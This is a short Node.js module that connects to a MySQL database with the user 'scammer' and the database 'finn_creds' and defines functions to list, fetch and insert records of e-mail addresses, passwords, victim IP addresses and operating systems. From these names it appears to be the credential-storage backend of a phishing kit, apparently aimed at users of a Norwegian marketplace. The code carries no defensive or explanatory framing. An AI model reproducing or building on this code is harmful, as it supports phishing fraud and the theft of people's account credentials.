import mysql from "mysql2"
import dotenv from "dotenv"

dotenv.config()

const db = mysql.createPool({
    host: "100.112.84.62",
    user: "scammer",
    password: process.env.mysqlPass,
    database: "finn_creds"
}).promise()

export async function getCreds() {
    const [rows] = await db.query("SELECT * FROM creds")
    return rows
}

export async function getCred(id) {
    const [row] = await db.query(`
        SELECT * FROM creds
        WHERE id = ?
        `, [id])
    return row[0]
}

export async function insertCred(epost, passord, ip, os) {
    const [result] = await db.query(`
        INSERT INTO creds (epost, passord, ipv4, os)
        VALUES (?, ?, ?, ?)
        `, [epost, passord, ip || "no IP found", os || null])

    const id = result.insertId
    return getCred(id)
}